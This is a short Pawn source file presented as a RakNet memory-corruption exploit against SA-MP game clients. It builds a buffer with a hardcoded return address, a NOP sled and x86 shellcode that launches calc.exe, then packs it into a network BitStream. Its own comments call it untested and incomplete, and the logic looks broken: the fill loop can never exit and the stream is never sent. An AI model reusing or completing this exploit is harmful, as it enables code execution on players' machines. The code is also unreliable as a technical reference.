/*
  Raknet Exploit ; not tested 
  Jaber 
*/

#include <Pawn.RakNet>

stock Exploit(playerid)
{
  new len;
  new buffer[4096];
  new BitStream:bs = BS_New(); 

  new shellcode[] = {
        0xE8, 0x25, 0x00, 0x00, 0x00, 0x5B, 0x81, 0xEC, 
        0x80, 0x00, 0x00, 0x00, 0x6A, 0x01, 0x6A, 0x00,
        0x6A, 0x00, 0x53, 0x68, 0x78, 0x82, 0x44, 0x00, 
        0x6A, 0x00, 0xB8, 0x94, 0x61, 0x44, 0x00, 0xFF, 
        0x10, 0x6A, 0x00, 0xB8, 0x00, 0x61, 0x44, 0x00, 
        0xFF, 0x10, 0xE8, 0xD6, 0xFF, 0xFF, 0xFF, 0x63, 
        0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00  
  };
  
  new adresse;
  new size = sizeof(buffer);
  
  #emit LOAD.S.pri 12
  #emit STOR.S.pri adresse
  
  size *= 4;
  while(size > 0)
  {
    if(size >= 4096)
    {
      #emit LOAD.S.alt adresse
      #emit LOAD.S.pri 0x49
      #emit FILL 4096
      size -= 4096;
      adresse += 4096;
    }
  } 
  
  len = 588;
  
  buffer[len] = 0x4165E6;
  len += 4;
  buffer[len] = 0x90909090;
  len += 4;
  
  memcpy(buffer[len], shellcode, sizeof(shellcode));
  
  len += sizeof(shellcode);
  
  BS_WriteValue(
    bs, 
    PR_UINT32, len
  );
  
  BS_WriteValue(
    bs,
    PR_STRING, shellcode,
    PR_UINT32, len
  );
  
  // INCOMPLET !! en cours d'analyse du code du dll de samp
  
  BS_Delete(bs);
}
